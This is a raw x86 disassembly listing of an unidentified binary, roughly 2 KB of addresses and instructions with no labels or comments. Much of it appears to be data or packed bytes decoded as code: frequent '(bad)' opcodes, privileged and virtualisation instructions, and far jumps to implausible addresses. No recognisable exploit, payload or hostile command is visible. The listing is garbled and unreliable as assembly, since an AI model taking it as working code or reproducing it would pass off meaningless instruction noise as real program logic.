  431412:	jmp    DWORD PTR [esi-0x18]
  431415:	inc    ebp
  431416:	sbb    BYTE PTR [ebp-0x767acd00],cl
  43141c:	(bad)  
  43141d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43141e:	inc    eax
  431420:	test   DWORD PTR [esi-0x2],esp
  431423:	inc    ebp
  431424:	dec    DWORD PTR [ebp-0x760bde75]
  43142a:	(bad)  
  43142b:	test   al,0xc3
  43142d:	mov    DWORD PTR [ebp-0x769b56],ecx
  431433:	lods   al,BYTE PTR ds:[esi]
  431434:	push   eax
  431435:	inc    ebp
  431436:	jne    0x431447
  431438:	dec    DWORD PTR [ebp+0x8]
  43143b:	mov    eax,DWORD PTR [ebx]
  43143d:	sbb    al,0x0
  43143f:	(bad)  
  431440:	mov    eax,0xc14fc3
  431445:	mov    DWORD PTR [eax-0x64],edi
  431448:	inc    bp
  43144a:	test   DWORD PTR [edi],ecx
  43144c:	dec    DWORD PTR [ebp-0x1]
  43144f:	xor    eax,edi
  431451:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  431457:	inc    ebp
  431458:	xor    DWORD PTR [ebx],0x3f
  43145b:	mov    WORD PTR [ebp-0x1bc],ax
  431462:	lea    ecx,[ecx-0x767702]
  431468:	inc    esi
  431469:	(bad)  
  43146a:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  431471:	pushf  
  431472:	rol    DWORD PTR [ebp-0x72019a],0xff
  431479:	add    bh,bh
  43147b:	add    BYTE PTR [edi],cl
  43147d:	test   DWORD PTR [eax],eax
  43147f:	(bad)  
  431480:	dec    WORD PTR [ebp-0xff0031]
  431487:	mov    DWORD PTR [ecx-0xb748],ecx
  43148d:	lea    eax,[ebx+0x7cffc1b0]
  431493:	push   eax
  431494:	add    BYTE PTR [ebp+0x66],al
  431497:	xor    ecx,DWORD PTR [ebp-0xaf00fd]
  43149d:	test   eax,esi
  43149f:	(bad)  
  4314a0:	fdiv   st(7),st
  4314a2:	add    bh,bh
  4314a4:	data16 clc 
  4314a6:	lea    edx,[ebp-0x1]
  4314a9:	(bad)  
  4314aa:	dec    DWORD PTR [eax-0x72b50077]
  4314b0:	dec    DWORD PTR [eax-0x1237a73]
  4314b6:	(bad)  
  4314b7:	(bad)  
  4314b8:	(bad)  
  4314b9:	cdq    
  4314ba:	inc    DWORD PTR [eax]
  4314bc:	ja     0x431447
  4314be:	lea    edi,[eax-0x72000050]
  4314c4:	push   ecx
  4314c5:	mov    al,0x4d
  4314c7:	jmp    DWORD PTR [esi+0x50]
  4314ca:	mov    ch,0x45
  4314cc:	push   DWORD PTR [ebx]
  4314ce:	inc    DWORD PTR [ebx]
  4314d0:	push   ebx
  4314d1:	push   eax
  4314d2:	push   ecx
  4314d3:	test   DWORD PTR [ebx],esi
  4314d5:	(bad)  
  4314d6:	mov    ebx,0xff72ff
  4314db:	clc    
  4314dc:	retf   
  4314dd:	push   ebp
  4314de:	(bad)  
  4314df:	jmp    0x1421624
  4314e4:	push   ecx
  4314e5:	jae    0x4314a7
  4314e7:	add    BYTE PTR [ebp-0x38bb73],cl
  4314ed:	mov    DWORD PTR [ecx+0x40],edx
  4314f0:	(bad)  
  4314f1:	(bad)  
  4314f2:	cld    
  4314f3:	mov    eax,DWORD PTR [ebp-0x7a019a]
  4314f9:	inc    DWORD PTR [ebp-0x3f0101]
  4314ff:	inc    bp
  431501:	test   DWORD PTR [ebx+0xff98ff],ecx
  431507:	inc    edi
  431508:	(bad)  
  431509:	dec    si
  43150b:	test   edi,edi
  43150d:	(bad)  
  43150e:	cmp    eax,0xc74f7bff
  431513:	mov    edx,DWORD PTR [edx-0x7d]
  431516:	(bad)  
  431517:	mov    ebx,0x563a8931
  43151c:	(bad)  
  43151d:	call   FWORD PTR [esi-0x47]
  431520:	inc    DWORD PTR ds:0x893c00e2
  431526:	mov    DWORD PTR [eax-0x4c],ebx
  431529:	(bad)  
  43152a:	jmp    DWORD PTR [esi-0x1]
  43152d:	test   edi,edi
  43152f:	dec    DWORD PTR [eax]
  431531:	(bad)  
  431532:	inc    eax
  431534:	or     BYTE PTR [ecx+0x8b5745],bh
  43153a:	sbb    al,0x89
  43153c:	rcr    BYTE PTR [edx-0x7c],0xff
  431540:	add    ecx,DWORD PTR [ebx+0x6165b900]
  431546:	add    BYTE PTR [eax],al
  431548:	inc    ebp
  431549:	mov    DWORD PTR ds:0xc7ff9c5c,esi
  43154f:	data16 fdiv DWORD PTR [ebp-0x7007b]
  431556:	inc    ebp
  431557:	dec    ebp
  431558:	cmp    DWORD PTR [ecx-0x38b764],ecx
  43155e:	lock lea eax,[ebp+0x458df81c]
  431565:	(bad)  
  431566:	xor    eax,0x8b8b9fff
  43156b:	hlt    
  43156c:	cld    
  43156d:	mov    DWORD PTR [eax+0xff014c],eax
  431573:	mov    esi,0x78b0845
  431578:	cld    
  431579:	into   
  43157a:	dec    ebp
  43157b:	call   0x5100:0x38c328b
  431582:	mov    ecx,DWORD PTR [ebp-0x6f0075]
  431588:	add    BYTE PTR [ebx],dh
  43158a:	mov    DWORD PTR [eax-0x1c],eax
  43158d:	lea    edi,[ebp-0x2]
  431590:	test   edi,edi
  431592:	jne    0x4315e4
  431594:	push   DWORD PTR [ebp+0x18]
  431597:	mov    DWORD PTR [ebp+0x44],edx
  43159a:	call   0xffcd109e
  43159f:	mov    al,0x45
  4315a1:	dec    DWORD PTR [ebx+0x3fc8b8b]
  4315a7:	cmp    BYTE PTR [ecx+eax*1],0xf
  4315ab:	add    BYTE PTR [ebp-0x7b],al
  4315ae:	test   edi,edi
  4315b0:	je     0x4315b1
  4315b2:	dec    DWORD PTR [edi-0x4]
  4315b5:	dec    edi
  4315b6:	or     al,BYTE PTR [ebp-0x740001]
  4315bc:	cld    
  4315bd:	dec    edi
  4315be:	or     BYTE PTR [edi+0x1],0x85
  4315c2:	add    bh,bh
  4315c4:	add    bh,bh
  4315c6:	(bad)  
  4315c7:	icebp  
  4315c8:	ret    
  4315c9:	dec    edi
  4315ca:	inc    ebp
  4315cb:	xchg   ebp,eax
  4315cc:	jne    0x4315cc
  4315ce:	mov    edi,edi
  4315d0:	cld    
  4315d1:	xor    BYTE PTR [ecx+0x500155],cl
  4315d7:	push   ebp
  4315d8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4315de:	add    BYTE PTR [ebp+0x35e90f50],al
  4315e4:	add    al,BYTE PTR [eax]
  4315e6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4315ec:	add    ah,ch
  4315ee:	or     BYTE PTR [ebp+0x4501f845],dh
  4315f4:	jmp    0xdf18ee
  4315f9:	(bad)  
  4315fa:	nop    ecx
  4315fd:	test   DWORD PTR [ebp+0x4502f8],eax
  431603:	cmp    ecx,DWORD PTR [ebp-0x64]
  431606:	mov    eax,edi
  431608:	mov    ebx,DWORD PTR [eax+edx*2]
  43160b:	add    eax,0x45fef885
  431610:	dec    DWORD PTR [ebx+0x339445]
  431616:	add    ecx,DWORD PTR [ecx+0x4500f889]
  43161c:	dec    DWORD PTR [ebx-0x460f0375]
  431622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431623:	add    esi,edi
  431625:	add    bh,bh
  431627:	rdpmc  
  431629:	add    BYTE PTR [ebx],0x1
  43162c:	mov    DWORD PTR [eax],eax
  43162e:	add    al,0x45
  431630:	dec    DWORD PTR [ecx-0x360b3373]
  431636:	dec    DWORD PTR [esi]
  431638:	push   eax
  431639:	jne    0x431680
  43163b:	mov    esi,DWORD PTR [ebx]
  43163d:	cld    
  43163e:	add    ebp,ebp
  431640:	push   eax
  431641:	inc    DWORD PTR [ebp-0x75]
  431644:	add    eax,0x800e4
  431649:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43164f:	mov    DWORD PTR [ecx],eax
  431651:	sbb    al,0x0
  431653:	leave  
  431654:	test   DWORD PTR [edi-0x2],eax
  431657:	jne    0x431658
  431659:	call   0xff44015e
  43165e:	xor    BYTE PTR [ebp+0x4d],al
  431661:	mov    edi,edi
  431663:	enter  0x8,0x4d
  431667:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43166d:	mov    eax,DWORD PTR [eax]
  43166f:	cld    
  431670:	add    DWORD PTR [ecx],ebx
  431672:	inc    ebp
  431673:	dec    ebp
  431674:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43167a:	inc    eax
  43167b:	dec    DWORD PTR [ecx-0x270375]
  431681:	add    BYTE PTR [ebx-0x39d72701],cl
  431687:	xchg   ecx,eax
  431688:	ret    
  431689:	add    BYTE PTR [ebp-0x830075],al
  43168f:	add    BYTE PTR [ebp-0x75],al
  431692:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431698:	lea    edi,[edi-0xc]
  43169b:	add    bh,bh
  43169d:	mov    edx,DWORD PTR [eax-0x7b]
  4316a0:	inc    ebp
  4316a1:	rdpmc  
  4316a3:	jne    0x4316a8
  4316a5:	add    BYTE PTR [eax-0x75],dl
  4316a8:	inc    ebp
  4316a9:	clc    
  4316aa:	add    eax,0x400009
  4316af:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4316b5:	mov    eax,DWORD PTR [ecx]
  4316b7:	in     al,dx
  4316b8:	add    dh,al
  4316ba:	test   ebx,eax
  4316bc:	inc    BYTE PTR [ebp-0xff0001]
  4316c2:	add    BYTE PTR [ebp-0x43],al
  4316c5:	cmp    esi,0xfffffff8
  4316c8:	(bad)  
  4316c9:	push   DWORD PTR [eax]
  4316cb:	add    BYTE PTR [ebp-0x3a],dl
  4316ce:	test   ebx,eax
  4316d0:	je     0x431657
  4316d2:	mov    edi,edi
  4316d4:	sbb    al,0xff
  4316d6:	test   DWORD PTR gs:[eax],eax
  4316d9:	(bad)  
  4316da:	js     0x4316db
  4316dc:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4316e2:	sub    eax,ebx
  4316e4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4316ea:	add    eax,DWORD PTR [eax]
  4316ec:	dec    ebp
  4316ed:	push   eax
  4316ee:	mov    al,BYTE PTR [ebp+0x1]
  4316f1:	mov    eax,DWORD PTR [ebp-0x68]
  4316f4:	mov    eax,DWORD PTR [eax]
  4316f6:	sbb    bh,al
  4316f8:	or     ah,dh
  4316fa:	dec    ebp
  4316fb:	inc    DWORD PTR [eax+0x4]
  4316fe:	push   ecx
  4316ff:	add    BYTE PTR [edx-0x1],dh
  431702:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431708:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  431712:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431718:	push   ecx
  431719:	cmp    BYTE PTR [ebx],al
  43171b:	inc    ebp
  43171c:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  431722:	(bad)  
  431723:	(bad)  
  431724:	in     al,0xff
  431726:	add    BYTE PTR [ebp+0x0],al
  431729:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43172f:	add    al,bh
  431731:	(bad)  
  431732:	jmp    0x8d85:0x74b0558d
  431739:	dec    DWORD PTR [eax]
  43173b:	call   DWORD PTR [ebp-0x7b]
  43173e:	mov    edi,esi
  431740:	lock call DWORD PTR [ebp-0x75]
  431744:	mov    esi,esp
  431746:	mov    ah,0xc6
  431748:	mov    bh,0xc3
  43174a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431750:	add    DWORD PTR [eax],0x450050ff
  431756:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43175c:	inc    edi
  43175e:	push   esp
  431760:	jmp    0xcd00:0x660481ff
  431767:	mov    DWORD PTR [ebx],esi
  431769:	clc    
  43176a:	cmp    edi,0xff9cff3a
  431770:	jne    0x43177a
  431772:	mov    eax,eax
  431774:	add    esi,DWORD PTR [eax]
  431776:	int3   
  431777:	inc    ebp
  431778:	cmp    al,0x83
  43177a:	add    BYTE PTR [eax],bl
  43177c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431782:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431788:	mov    edi,eax
  43178a:	cmp    BYTE PTR [ebp+0x45],cl
  43178d:	jmp    0x43171a
  43178f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431792:	inc    ebp
  431793:	or     al,0x2
  431795:	dec    DWORD PTR [ebp+0x18]
  431798:	jne    0x4317ef
  43179a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4317a0:	mov    edi,DWORD PTR [ebx]
  4317a2:	in     al,0x50
  4317a4:	xchg   ecx,eax
  4317a5:	jmp    0x34366aa
  4317aa:	adc    al,0x8b
  4317ac:	inc    ebp
  4317ad:	mov    al,ds:0x8b04008b
  4317b2:	push   ebp
  4317b3:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4317b9:	push   ebp
  4317ba:	test   DWORD PTR [ebx-0x2800d701],ecx
  4317c0:	inc    ebp
  4317c1:	dec    ebp
  4317c2:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4317c8:	mov    DWORD PTR [eax],0xe9ff00f4
  4317ce:	add    al,0x0
  4317d0:	add    BYTE PTR [eax],al
  4317d2:	mov    eax,edx
  4317d4:	push   eax
  4317d5:	rol    DWORD PTR [ebp-0xf0177],1
  4317db:	bound  eax,QWORD PTR [ebp+0x50]
  4317de:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4317e4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4317ea:	mov    al,0xf
  4317ec:	test   DWORD PTR [edx],edx
  4317ee:	call   DWORD PTR [ebp-0x7a0001]
  4317f4:	(bad)  
  4317f5:	loop   0x4317f6
  4317f7:	jnp    0xc6990bfd
  4317fd:	mov    eax,ebx
  4317ff:	cmp    al,0x8b
  431801:	(bad)  
  431802:	cld    
  431803:	shr    esi,0xc
  431806:	add    dl,al
  431808:	push   eax
  431809:	lea    eax,[ebp-0x1]
  43180c:	mov    edx,esi
  43180e:	cwde   
  43180f:	cli    
  431810:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431816:	or     BYTE PTR [eax],cl
  431818:	inc    ebp
  431819:	dec    ebp
  43181a:	inc    DWORD PTR [ebx+0x74803914]
  431820:	add    DWORD PTR [ebx+0x451800],ecx
  431826:	call   DWORD PTR [eax+edx*1]
  431829:	add    ecx,DWORD PTR [ebp-0x34]
  43182c:	push   edi
  43182d:	adc    al,0x8
  43182f:	mov    edx,DWORD PTR [ebp-0x14]
  431832:	mov    ecx,DWORD PTR [ebp+0x18]
  431835:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431839:	inc    DWORD PTR [eax+esi*8]
  43183c:	inc    ebp
  43183d:	stos   BYTE PTR es:[edi],al
  43183e:	mov    edx,DWORD PTR [ebp-0x4]
  431841:	add    DWORD PTR [ebp-0x1c],eax
  431844:	mov    edx,DWORD PTR [ebp-0x70]
  431847:	cmp    eax,DWORD PTR [eax]
  431849:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43184a:	mov    eax,DWORD PTR [eax]
  43184c:	cld    
  43184d:	jae    0x4317cf
  43184f:	add    eax,DWORD PTR [ecx]
  431851:	clc    
  431852:	add    BYTE PTR [eax+0x30],dl
  431855:	mov    DWORD PTR [ecx],esi
  431857:	clc    
  431858:	pop    ds
  431859:	inc    ebp
  43185a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431860:	(bad)  
  431861:	push   DWORD PTR [edi]
  431863:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431869:	(bad)  
  43186a:	jae    0x43186b
  43186c:	mov    eax,DWORD PTR [ebp-0x740175]
  431872:	sub    eax,DWORD PTR [eax]
  431874:	add    eax,DWORD PTR [eax]
  431876:	mov    DWORD PTR [ecx+0x5f],eax
  431879:	mov    DWORD PTR [ebx-0x4],ebx
  43187c:	ret    0xff
  43187f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431885:	ret    
  431886:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43188c:	add    BYTE PTR [ebp-0x7d],al
  43188f:	mov    DWORD PTR [eax],eax
  431891:	add    al,0x84
  431893:	inc    DWORD PTR [ecx]
  431895:	lea    eax,[eax]
  431897:	hlt    
  431898:	sar    bh,cl
  43189a:	test   BYTE PTR [eax+0x1],dl
  43189d:	inc    ebp
  43189e:	add    BYTE PTR [ebx],dh
  4318a0:	test   BYTE PTR [ebx],0x84
  4318a3:	push   eax
  4318a4:	add    BYTE PTR [ebp+0x0],al
  4318a7:	add    eax,0x86
  4318ac:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4318b2:	add    BYTE PTR [ecx],al
  4318b4:	add    BYTE PTR [eax],al
  4318b6:	mov    esi,0x550030
  4318bb:	mov    ecx,DWORD PTR [edi]
  4318bd:	cld    
  4318be:	fidiv  DWORD PTR [ebp+0x0]
  4318c1:	mov    edi,DWORD PTR [ecx]
  4318c3:	xor    BYTE PTR [eax+eax*1],0x84
  4318c7:	add    eax,DWORD PTR [eax]
  4318c9:	sbb    BYTE PTR [eax],al
  4318cb:	jne    0x43187e
  4318cd:	mov    eax,DWORD PTR [ecx]
  4318cf:	sbb    BYTE PTR [eax],al
  4318d1:	mov    DWORD PTR [ebp-0x1],esp
  4318d4:	add    BYTE PTR [eax+0x30e45ca],bh
  4318da:	ret    0xb7fc
  4318dd:	dec    ebp
  4318de:	or     al,0x89
  4318e0:	dec    ebp
  4318e1:	cld    
  4318e2:	cmovne ecx,DWORD PTR [eax-0x75]
  4318e6:	add    edi,esp
  4318e8:	seto   BYTE PTR [esi-0x72ffffff]
  4318ef:	inc    ebp
  4318f0:	adc    al,0x8b
  4318f2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4318f9:	cmp    DWORD PTR [edi+0x72],edx
  4318fc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  431902:	gs cmp al,0x0
  431905:	je     0x4318dd
  431907:	push   eax
  431908:	sar    BYTE PTR [eax],1
  43190a:	mov    bh,0x3e
  43190c:	push   cs
  43190d:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  431913:	add    DWORD PTR [ecx+0x12],ebp
  431916:	dec    edx
  431917:	(bad)  
  431918:	mov    eax,edx
  43191a:	in     al,dx
  43191b:	adc    DWORD PTR [ecx],esi
  43191d:	pop    esi
  43191e:	inc    ecx
  43191f:	leave  
  431920:	or     DWORD PTR [eax],ebx
  431922:	gs push ebp
  431924:	add    ah,ch
  431926:	into   
  431927:	in     al,dx
  431928:	enter  0xb756,0xf0
  43192c:	push   cs
  43192d:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431937:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  43193d:	jnp    0x74439e45
  431943:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431949:	add    BYTE PTR [edi],cl
  43194b:	mov    edi,DWORD PTR [ecx-0x78]
  43194e:	ltr    WORD PTR [ecx-0x7b]
  431952:	dec    DWORD PTR [edi]
  431954:	clc    
  431955:	out    0x45,eax
  431957:	add    BYTE PTR [eax],cl
  431959:	cmp    ebx,0xffffff8c
  43195c:	jge    0x43195e
  43195e:	jb     0x431970
  431960:	je     0x5219e0
  431966:	pop    edx
  431967:	push   esi
  431968:	mov    ecx,DWORD PTR [edi]
  43196a:	in     al,dx
  43196b:	rol    DWORD PTR [ebp+0x0],1
  43196e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431975:	cmp    DWORD PTR [ecx],0xfffffff0
  431978:	hlt    
  431979:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43197f:	(bad)  
  431981:	push   eax
  431982:	jns    0xb842fe00
  431988:	lock push cs
  43198a:	ror    edx,0x3
  43198d:	test   BYTE PTR [ecx+0x5500e800],cl
  431993:	dec    eax
  431994:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431998:	(bad)  
  431999:	mov    esi,0x7f33ff5f
  43199e:	inc    eax
  43199f:	test   DWORD PTR [edx],eax
  4319a1:	je     0x431963
  4319a3:	mov    ecx,ecx
  4319a5:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4319a9:	and    eax,DWORD PTR [eax+0xf0103]
  4319af:	jp     0x43199d
  4319b1:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4319b5:	add    edx,DWORD PTR [edi+0x74]
  4319b8:	sbb    BYTE PTR [ebp+0x4d001484],cl
  4319be:	add    BYTE PTR [ebp-0x74c48bbb],al
  4319c4:	je     0x431949
  4319c6:	cmp    eax,edi
  4319c8:	js     0x4319ed
  4319ca:	add    eax,0xeb0fc003
  4319cf:	jns    0x43195c
  4319d1:	vmread DWORD PTR [ecx+0x45],ebx
  4319d5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  4319db:	adc    al,0x8b
  4319dd:	jge    0x4319f3
  4319df:	mov    edi,DWORD PTR [eax-0x4]
  4319e2:	add    edi,DWORD PTR [edi]
  4319e4:	or     bh,bh
  4319e6:	push   ebp
  4319e7:	push   es
  4319e8:	mov    DWORD PTR [ebp-0x4],ebx
  4319eb:	add    edi,esi
  4319ed:	pop    es
  4319ee:	add    esi,DWORD PTR [edi-0x48ccf183]
  4319f4:	mov    DWORD PTR [esp+esi*8],ecx
  4319f7:	inc    ebp
  4319f8:	pop    ebp
  4319f9:	xor    DWORD PTR [esi-0x4],0x3b
  4319fd:	add    edx,DWORD PTR [ecx+edi*1]
  431a00:	push   es
  431a01:	clc    
  431a02:	mov    bh,0xdb
  431a04:	jp     0x4319bd
  431a06:	add    cl,BYTE PTR [esi]
  431a08:	div    DWORD PTR [edi+0x4d8b0c1c]
  431a0e:	test   edi,edi
  431a10:	je     0x431a06
  431a12:	mov    eax,ecx
  431a14:	or     BYTE PTR [ebx],al
  431a16:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431a1c:	jbe    0x431a90
  431a1e:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431a24:	add    ecx,DWORD PTR [esi]
  431a26:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431a2c:	add    eax,DWORD PTR [ebx-0x287af783]
  431a32:	je     0x431a81
  431a34:	mov    DWORD PTR [ecx],edi
  431a36:	mov    esi,eax
  431a38:	hlt    
  431a39:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431a40:	jb     0x431a02
  431a42:	jmp    0x431a2f
  431a44:	xor    esi,DWORD PTR [ebx]
  431a46:	pop    edi
  431a47:	pop    esi
  431a48:	pop    ebx
  431a49:	ret    
  431a4a:	ret    0x8b
  431a4d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a53:	xor    DWORD PTR ds:0x89339c0c,0x56
  431a5a:	cld    
  431a5b:	cmp    DWORD PTR [ebp+0xf],eax
  431a5e:	xor    al,0x85
  431a60:	pushf  
  431a61:	add    BYTE PTR [ebx+0x4d0cfc8b],cl
  431a67:	ret    
  431a68:	mov    edi,DWORD PTR [esi-0x4]
  431a6b:	pop    eax
  431a6c:	dec    ebp
  431a6d:	jne    0x4319fa
  431a6f:	xor    edi,esp
  431a71:	inc    eax
  431a72:	dec    ebp
  431a73:	jbe    0x431ac8
  431a75:	inc    eax
  431a76:	pop    ebp
  431a77:	add    edx,DWORD PTR [esi+0x8]
  431a7a:	push   ebx
  431a7b:	dec    eax
  431a7c:	push   ecx
  431a7d:	mov    eax,edi
  431a7f:	and    al,0xf0
  431a81:	jo     0x431a6e
  431a83:	mov    eax,DWORD PTR [ebx]
  431a85:	sbb    BYTE PTR [ebp+0x4d],cl
  431a88:	mov    eax,DWORD PTR [ebx]
  431a8a:	nop
  431a8b:	or     BYTE PTR [eax],al
  431a8d:	jne    0x431ae6
  431a8f:	cmp    ebx,DWORD PTR [edx+0x33893277]
  431a95:	cld    
  431a96:	xor    edi,edi
  431a98:	add    edi,DWORD PTR [ebp+0x3]
  431a9b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431aa1:	js     0x431a27
  431aa3:	jae    0x431aa7
  431aa5:	(bad)  
  431aa7:	xor    al,0x5d
  431aa9:	jmp    0x431a36
  431aab:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431ab2:	fdecstp 
  431ab4:	test   BYTE PTR [edi],ah
  431ab6:	add    bh,BYTE PTR [ebp+0x0]
  431ab9:	add    ebx,DWORD PTR [ebp-0x77]
  431abc:	mov    edi,eax
  431abe:	cmp    al,0x0
  431ac1:	adc    dh,BYTE PTR [ebx]
  431ac3:	jge    0x431ac8
  431ac5:	mov    edi,DWORD PTR [ebx]
  431ac7:	jl     0x431ad8
  431ac9:	clc    
  431aca:	dec    edi
  431acb:	jge    0x431acd
  431acd:	mov    eax,DWORD PTR [ebx]
  431acf:	jb     0x431ad9
  431ad1:	mov    ecx,DWORD PTR [ebp-0x8]
  431ad4:	mov    edi,edi
  431ad6:	xor    edx,DWORD PTR [eax]
  431ad8:	add    edi,DWORD PTR [ebx]
  431ada:	mov    DWORD PTR [ebp-0x10],edi
  431add:	inc    edi
  431ade:	pop    ebp
  431adf:	jge    0x431b1c
  431ae1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431ae5:	mov    edx,0xc05d87f0
  431aea:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431aee:	fimul  WORD PTR [eax]
  431af0:	fist   WORD PTR [ebp+0x1c]
  431af3:	in     al,dx
  431af4:	jne    0x431ae2
  431af6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431afc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431b00:	fdivp  st(0),st
  431b02:	fild   WORD PTR [ebp+0x4510f85c]
  431b08:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431b0e:	inc    ebp
  431b0f:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431b15:	mov    ebp,DWORD PTR [ebx-0x4]
  431b18:	adc    al,0x8b
  431b1a:	rcl    DWORD PTR [eax],0x48
  431b1d:	mov    esi,0x7080803
  431b22:	fiadd  WORD PTR [ebp+0x4d]
  431b25:	(bad)  
  431b26:	mov    edx,DWORD PTR [edx-0x4]
  431b29:	mov    edx,DWORD PTR [ebp-0x4]
  431b2c:	xor    ebx,DWORD PTR [ebx+0x330103]
  431b32:	mov    DWORD PTR [edi+0x872dc],edi
  431b38:	xlat   BYTE PTR ds:[ebx]
  431b39:	into   
  431b3a:	ffreep st(6)
  431b3c:	retf   0x6c7
  431b3f:	iret   
  431b40:	dec    ebp
  431b41:	inc    ebp
  431b42:	mov    DWORD PTR [ebx],edi
  431b44:	fmul   QWORD PTR [edi]
  431b46:	dec    ebp
  431b47:	jnp    0x431b7c
  431b49:	add    BYTE PTR [ebx],al
  431b4b:	mov    ecx,DWORD PTR [esp+edi*8]
  431b4e:	inc    ebp
  431b4f:	dec    ebp
  431b50:	lea    esi,[ebx]
  431b52:	add    DWORD PTR [ebx],eax
  431b54:	jb     0x431b91
  431b56:	add    BYTE PTR [edi],cl
  431b58:	inc    ebp
  431b59:	imul   eax,edi,0x858bd800
  431b5f:	cld    
  431b60:	clc    
  431b61:	mov    DWORD PTR [ebp+0x0],eax
  431b64:	inc    DWORD PTR [eax]
  431b66:	or     al,0xde
  431b68:	sbb    bh,0x1
  431b6b:	retf   
  431b6c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431b73:	dec    ebp
  431b74:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431b7a:	enter  0x12de,0xdf
  431b7e:	inc    ebp
  431b7f:	pop    ebp
  431b80:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b86:	add    DWORD PTR [edx],edx
  431b88:	add    BYTE PTR [ebp+0x50],dl
  431b8b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431b91:	xor    ecx,DWORD PTR [ebx+eax*1+0xac73966]
  431b98:	loopne 0x431bb1
  431b9a:	cdq    
  431b9b:	push   ebp
  431b9c:	clc    
  431b9d:	mov    eax,DWORD PTR [ebp-0x4]
  431ba0:	xor    edx,edx
  431ba2:	add    esi,DWORD PTR [ebx]
  431ba4:	cmp    eax,DWORD PTR [ebx]
  431ba6:	hlt    
  431ba7:	cmp    DWORD PTR [ebx],esp
  431ba9:	or     al,BYTE PTR [ebp+0xf]
  431bac:	mov    eax,DWORD PTR [edx]
  431bae:	loopne 0x431bb0
  431bb0:	(bad)  
  431bb1:	mov    ecx,esi
  431bb3:	cld    
  431bb4:	pushf  
  431bb5:	pop    ebp
  431bb6:	call   0x10c0:0x8bf0328b
  431bbd:	add    eax,DWORD PTR [eax+0x10018b]
  431bc3:	dec    ebp
  431bc4:	iret   
  431bc5:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431bcb:	dec    ebp
  431bcc:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431bd2:	(bad)  
  431bd3:	iret   
  431bd4:	inc    ebp
  431bd5:	(bad)  
  431bd6:	jne    0x431c25
  431bd8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431bde:	(bad)  
  431bdf:	cmp    ebx,eax
  431be1:	je     0x431b69
  431be3:	add    edi,edi
  431be5:	or     bh,bh
  431be7:	dec    ebp
  431be8:	inc    ebp
  431be9:	mov    esi,DWORD PTR [ebx]
  431beb:	cld    
  431bec:	add    ecx,esi
  431bee:	cmp    ecx,DWORD PTR [eax-0xc]
  431bf1:	mov    edx,DWORD PTR [edi]
  431bf3:	or     BYTE PTR [ebp-0x7c],al
  431bf6:	mov    ebx,DWORD PTR [edx-0x7639cd18]
  431bfc:	test   BYTE PTR [edx+ebx*4],cl
  431bff:	inc    ebp
  431c00:	xor    bh,BYTE PTR [eax]
  431c02:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431c09:	jne    0x431bd2
  431c0b:	mov    ebp,esp
  431c0d:	fcomp  DWORD PTR [ebx]
